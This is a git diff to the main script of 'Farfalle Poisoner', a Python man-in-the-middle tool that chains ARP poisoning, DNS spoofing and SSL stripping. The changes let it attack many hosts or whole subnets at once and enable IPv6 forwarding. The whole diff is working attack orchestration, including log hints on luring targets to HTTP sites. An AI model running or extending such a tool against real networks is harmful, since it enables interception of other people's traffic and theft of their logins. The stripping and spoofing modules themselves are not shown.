@@ -4,6 +4,7 @@ import time
 import sys
 import os
 import subprocess
+import ipaddress
 from scapy.layers.inet import IP
 
 from modules.arp_spoofer import ARPSpoofer
@@ -18,7 +19,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger('FarfallePoisoner')
 
-# So important B)
+# So important B) would like to use it more but sigh idk maybe later
 try:
     from colorama import init, Fore, Style
     init(autoreset=True)
@@ -32,18 +33,16 @@ except ImportError:
 
 
 class FarfallePoisoner:
-    """Main class for the Farfalle ARP/SSL poisoning tool"""
+    """ONE FARFALLE VONGOLE PLZ"""
 
-    # TODO so uh rnow verbose means sh, like i couldnt be assedk to pass verbose or debug eveyrwhere but yeah work in progress i mean lowk all the code is kinda spgahetti (get it, i mean we're farfalle but, get it, dammit shoudlve done spaghett)
     def __init__(self):
         self.args = self._parse_arguments()
         self.interface = self.args.interface
-        self.target_ip = self.args.target
+        self.target_ips = self._parse_targets(self.args.target)
         self.gateway_ip = self.args.gateway
         self.mode = self.args.mode
         self.verbose = self.args.verbose
 
-        # Set logging level which lwokey i forgot to abide to
         if self.verbose:
             logging.getLogger().setLevel(logging.DEBUG)
         elif self.args.silent:
@@ -52,37 +51,21 @@ class FarfallePoisoner:
         # Initialize components
         self.scanner = NetworkScanner(self.interface)
         self.packet_handler = PacketHandler(
-            self.interface, self.gateway_ip, self.target_ip)
+            self.interface, self.gateway_ip, self.target_ips)
 
-        if self.verbose:
-            targets = {
-                '18.158.249.75',
-                '3.125.209.94',
-            }
-
-            def log_all_packets(packet):
-                if IP in packet and (packet[IP].dst in targets or packet[IP].src in targets):
-                    src = packet[IP].src
-                    dst = packet[IP].dst
-                    proto = packet[IP].proto
-                    logger.info(f"Packet: {src} -> {dst} (proto={proto})")
-                return False
-
-            self.packet_handler.add_filter(log_all_packets)
-
-        self.arp_spoofer = None
+        self.arp_spoofers = {}  # mapahash
         self.dns_spoofer = None
         self.ssl_stripper = None
 
-        # Initialize based on mode is this a dumb way to do it.... no nvm its ok
         if self.mode in ['arp', 'all']:
             try:
-                self.arp_spoofer = ARPSpoofer(
-                    interface=self.interface,
-                    target_ip=self.target_ip,
-                    gateway_ip=self.gateway_ip,
-                    packet_handler=self.packet_handler
-                )
+                for target_ip in self.target_ips:
+                    self.arp_spoofers[target_ip] = ARPSpoofer(
+                        interface=self.interface,
+                        target_ip=target_ip,
+                        gateway_ip=self.gateway_ip,
+                        packet_handler=self.packet_handler
+                    )
             except ValueError as e:
                 logger.error(f"Failed to initialize ARP spoofer: {e}")
                 sys.exit(1)
@@ -96,29 +79,58 @@ class FarfallePoisoner:
 
             self.dns_spoofer = DNSSpoofer(
                 interface=self.interface,
-                target_ip=self.target_ip,
+                target_ips=self.target_ips,
                 dns_mapping=dns_mapping if dns_mapping else None,
-                packet_handler=self.packet_handler
+                packet_handler=self.packet_handler,
+                verbose=self.verbose
             )
 
         if self.mode in ['ssl', 'all']:
             self.ssl_stripper = SSLStripper(
                 interface=self.interface,
                 packet_handler=self.packet_handler,
-                target_ip=self.target_ip
+                target_ips=self.target_ips,
+                verbose=self.verbose
             )
+
+    def _parse_targets(self, target_str):
+        targets = []
+
+        # INPUT MUST BE COMMA SPLIT
+        parts = [p.strip() for p in target_str.split(',')]
+
+        for part in parts:
+            try:
+                # Try to parse as network/subnet
+                network = ipaddress.ip_network(part, strict=False)
+                # Skip network and broadcast addresses for subnets
+                if network.num_addresses > 1:
+                    for ip in network.hosts():
+                        targets.append(str(ip))
+                else:
+                    targets.append(str(network.network_address))
+            except ValueError:
+                # Not a valid network, treat as single IP
+                try:
+                    ip = ipaddress.ip_address(part)
+                    targets.append(str(ip))
+                except ValueError:
+                    logger.error(f"Invalid IP address or network: {part}")
+                    sys.exit(1)
+
+        return targets
 
     def _parse_arguments(self):
         """Parse command line arguments"""
         parser = argparse.ArgumentParser(
-            description='🍝 Farfalle Poisoner - ARP/DNS/SSL poisoning tool',
+            description='Farfalle Poisoner - ARP/DNS/SSL poisoning tool',
             formatter_class=argparse.ArgumentDefaultsHelpFormatter
         )
 
         parser.add_argument('-i', '--interface', required=True,
                             help='Network interface to use (e.g., eth0, wlan0, en0)')
         parser.add_argument('-t', '--target', required=True,
-                            help='Target IP address to poison')
+                            help='Target IP(s) to poison. Supports: single IP (192.168.1.5), multiple IPs (192.168.1.5,192.168.1.6), or subnet (192.168.1.0/24)')
         parser.add_argument('-g', '--gateway', required=True,
                             help='Gateway IP address')
         parser.add_argument('-m', '--mode', default='all',
@@ -145,10 +157,12 @@ class FarfallePoisoner:
         hosts = self.scanner.scan(network_range)
 
         if hosts:
-            print(f"\n{Fore.GREEN}Found {len(hosts)} hosts:{Style.RESET_ALL}")
-            for host in hosts:
-                print(f"  {host['ip']:<15} - {host['mac']}")
-            print()
+            if self.verbose:
+                logger.info(f"Found {len(hosts)} hosts:")
+                for host in hosts:
+                    logger.info(f"  {host['ip']:<15} - {host['mac']}")
+            else:
+                logger.info(f"Found {len(hosts)} hosts on network")
         else:
             logger.warning("No hosts found on network")
 
@@ -161,7 +175,8 @@ class FarfallePoisoner:
                 return
 
         logger.info(f"Starting Farfalle Poisoner in {self.mode} mode")
-        logger.info(f"Target: {self.target_ip}")
+        logger.info(
+            f"Targets: {', '.join(self.target_ips)} ({len(self.target_ips)} hosts)")
         logger.info(f"Gateway: {self.gateway_ip}")
 
         try:
@@ -169,33 +184,39 @@ class FarfallePoisoner:
             self._enable_ip_forwarding()
 
             # For SSL stripping, we need ARP spoofing active for the MITM
-            if self.mode == 'ssl' and not self.arp_spoofer:
+            if self.mode == 'ssl' and not self.arp_spoofers:
                 logger.info(
                     "SSL stripping requires ARP spoofing - enabling it")
-                self.arp_spoofer = ARPSpoofer(
-                    interface=self.interface,
-                    target_ip=self.target_ip,
-                    gateway_ip=self.gateway_ip,
-                    packet_handler=self.packet_handler
-                )
+                for target_ip in self.target_ips:
+                    self.arp_spoofers[target_ip] = ARPSpoofer(
+                        interface=self.interface,
+                        target_ip=target_ip,
+                        gateway_ip=self.gateway_ip,
+                        packet_handler=self.packet_handler
+                    )
 
             # For DNS spoofing with SSL stripping, we need both ARP and DNS
             if self.mode in ['dns', 'all'] and self.ssl_stripper:
                 logger.info("DNS + SSL stripping attack mode activated")
-                if not self.arp_spoofer:
-                    self.arp_spoofer = ARPSpoofer(
-                        interface=self.interface,
-                        target_ip=self.target_ip,
-                        gateway_ip=self.gateway_ip,
-                        packet_handler=self.packet_handler
-                    )
+                if not self.arp_spoofers:
+                    for target_ip in self.target_ips:
+                        self.arp_spoofers[target_ip] = ARPSpoofer(
+                            interface=self.interface,
+                            target_ip=target_ip,
+                            gateway_ip=self.gateway_ip,
+                            packet_handler=self.packet_handler
+                        )
 
             # Start packet handler first and NOTE the order of arp -> dns -> ssl is also importante
             self.packet_handler.start()
             time.sleep(1)
 
-            if self.arp_spoofer:
-                self.arp_spoofer.start()
+            if self.arp_spoofers:
+                for target_ip, spoofer in self.arp_spoofers.items():
+                    spoofer.start()
+                    if self.verbose:
+                        logger.info(
+                            f"[VONGOLE] ARP spoofing active for {target_ip}")
                 logger.info("[VONGOLE] ARP spoofing active")
                 time.sleep(2)
 
@@ -208,52 +229,50 @@ class FarfallePoisoner:
                 self.ssl_stripper.start()
                 logger.info("[VONGOLE] SSL stripping active")
 
-                if self.dns_spoofer:
-                    print(
-                        f"\n{Fore.YELLOW}NOTE: DNS + SSL Stripping Active!{Style.RESET_ALL}")
-                    print(
-                        f"{Fore.CYAN}1. Domains will resolve to your IP ({self.dns_spoofer.attacker_ip}){Style.RESET_ALL}")
-                    print(
-                        f"{Fore.CYAN}2. HTTP traffic will be transparently proxied{Style.RESET_ALL}")
-                    print(
-                        f"{Fore.CYAN}3. HTTPS redirects will be stripped{Style.RESET_ALL}")
-                    print(
-                        f"\n{Fore.GREEN}Try having the target browse to: http://github.com or http://example.com{Style.RESET_ALL}")
-                else:
-                    print(
-                        f"\n{Fore.YELLOW}NOTE: Target must browse HTTP sites for SSL stripping to work!{Style.RESET_ALL}")
-                    print(
-                        f"{Fore.YELLOW}Try having the target visit: http://example.com{Style.RESET_ALL}")
+                if self.verbose:
+                    if self.dns_spoofer:
+                        logger.info("NOTE: DNS + SSL Stripping Active!")
+                        logger.info(
+                            f"1. Domains will resolve to your IP ({self.dns_spoofer.attacker_ip})")
+                        logger.info(
+                            "2. HTTP traffic will be transparently proxied")
+                        logger.info("3. HTTPS redirects will be stripped")
+                        logger.info(
+                            "Try having the target browse to: http://github.com or http://example.com")
+                    else:
+                        logger.info(
+                            "NOTE: Target must browse HTTP sites for SSL stripping to work!")
+                        logger.info(
+                            "Try having the target visit: http://example.com")
 
-            print(
-                f"\n{Fore.GREEN}🍝 Buon appetito! Attack is running...{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}Press Ctrl+C to stop if ur on mac ofc the superior os, otherwise whateve rur comptuer uses, act wait dont they all use ctrl... i forgot{Style.RESET_ALL}\n")
+            logger.info("Buon appetito! Attack is running...")
+            logger.info("Press Ctrl+C to stop")
 
             # Status display loop
-            last_stats_time = time.time()
-            while True:
-                time.sleep(1)
+            if self.verbose:
+                last_stats_time = time.time()
+                while True:
+                    time.sleep(1)
 
-                # Show stats every 10 seconds
-                if time.time() - last_stats_time > 10:
-                    stats = self.packet_handler.get_stats()
-                    status_parts = [
-                        f"Forwarded: {stats['forwarded']}", f"Dropped: {stats['dropped']}"]
+                    # Show stats every 10 seconds
+                    if time.time() - last_stats_time > 10:
+                        stats = self.packet_handler.get_stats()
+                        status_parts = [
+                            f"Forwarded: {stats['forwarded']}", f"Dropped: {stats['dropped']}"]
 
-                    if self.ssl_stripper:
-                        status_parts.append(
-                            f"SSL Strips: {self.ssl_stripper.stripped_count}")
+                        if self.ssl_stripper:
+                            status_parts.append(
+                                f"SSL Strips: {self.ssl_stripper.stripped_count}")
 
-                    if self.dns_spoofer:
-                        status_parts.append(
-                            f"DNS Spoofs: {self.dns_spoofer.spoofed_count}")
+                        if self.dns_spoofer:
+                            status_parts.append(
+                                f"DNS Spoofs: {self.dns_spoofer.spoofed_count}")
 
-                    print(
-                        f"\r{Fore.CYAN}[Stats] {' | '.join(status_parts)}{Style.RESET_ALL}", end='')
+                        logger.info(f"[Stats] {' | '.join(status_parts)}")
                     last_stats_time = time.time()
 
         except KeyboardInterrupt:
-            print(f"\n{Fore.YELLOW}Stopping attack...{Style.RESET_ALL}")
+            logger.info("Stopping attack...")
         except Exception as e:
             logger.error(f"Error during attack: {e}")
         finally:
@@ -270,8 +289,9 @@ class FarfallePoisoner:
         if self.dns_spoofer:
             self.dns_spoofer.stop()
 
-        if self.arp_spoofer:
-            self.arp_spoofer.stop()
+        if self.arp_spoofers:
+            for spoofer in self.arp_spoofers.values():
+                spoofer.stop()
 
         # Stop packet handler
         self.packet_handler.stop()
@@ -279,8 +299,8 @@ class FarfallePoisoner:
         # Disable IP forwarding
         self._disable_ip_forwarding()
 
-        print(f"\n{Fore.GREEN}🦋 Attack stopped and cleaned up 🦋{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}🍝 Grazie! 🍝{Style.RESET_ALL}")
+        logger.info("Attack stopped and cleaned up 🦋")
+        logger.info("Grazie! 🍝")
 
     def _enable_ip_forwarding(self):
         """Enable IP forwarding based on platform"""
@@ -289,9 +309,19 @@ class FarfallePoisoner:
         self.original_ip_forward_state = None
 
         if sys.platform.startswith("linux"):
+            # IPv4
             with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                 self.original_ip_forward_state = f.read().strip()
             os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+            # IPv6
+            try:
+                with open('/proc/sys/net/ipv6/conf/all/forwarding', 'r') as f:
+                    self.original_ipv6_forward_state = f.read().strip()
+                os.system("echo 1 > /proc/sys/net/ipv6/conf/all/forwarding")
+            except:
+                pass
+
         elif sys.platform == "darwin":
             result = subprocess.run(["sysctl", "net.inet.ip.forwarding"],
                                     capture_output=True, text=True)
@@ -307,6 +337,12 @@ class FarfallePoisoner:
                         "Failed to enable IP forwarding - run with sudo!")
             else:
                 logger.info("IP forwarding already enabled")
+
+            try:
+                os.system("sudo sysctl -w net.inet6.ip6.forwarding=1")
+            except:
+                pass
+
         elif sys.platform.startswith("win"):
             logger.warning("Please enable IP forwarding manually on Windows")
         else:
@@ -320,10 +356,14 @@ class FarfallePoisoner:
         if sys.platform.startswith("linux"):
             if hasattr(self, 'original_ip_forward_state') and self.original_ip_forward_state == "0":
                 os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-                logger.info("IP forwarding restored to disabled")
+                logger.info("IPv4 forwarding restored to disabled")
+            if hasattr(self, 'original_ipv6_forward_state') and self.original_ipv6_forward_state == "0":
+                os.system("echo 0 > /proc/sys/net/ipv6/conf/all/forwarding")
+                logger.info("IPv6 forwarding restored to disabled")
         elif sys.platform == "darwin":
             if hasattr(self, 'original_ip_forward_state') and not self.original_ip_forward_state:
                 os.system("sudo sysctl -w net.inet.ip.forwarding=0")
+                os.system("sudo sysctl -w net.inet6.ip6.forwarding=0")
                 logger.info("IP forwarding restored to disabled")
 
 
@@ -352,11 +392,11 @@ def print_banner():
 
     if HAS_COLOR:
         print(Fore.GREEN + logo)
-        print(Fore.YELLOW + "🍝🦋 Farfalle Poisoner 🦋🍝" + Style.RESET_ALL)
-        print(Fore.CYAN + "ARP/DNS/SSL Network Poisoning Tool\n" + Style.RESET_ALL)
+        print(Fore.YELLOW + "🍝🦋 ONE FARFALLE VONGOLE PLZ 🦋🍝" + Style.RESET_ALL)
+        print(Fore.CYAN + "ARP, DNS w SSL capabilities Network Poisoning Tool\n" + Style.RESET_ALL)
     else:
         print(logo)
-        print("🍝🦋 Farfalle Poisoner 🦋🍝")
+        print("🍝🦋 ONE FARFALLE VONGOLE PLZ 🦋🍝")
         print("ARP/DNS/SSL Network Poisoning Tool\n")
 
 
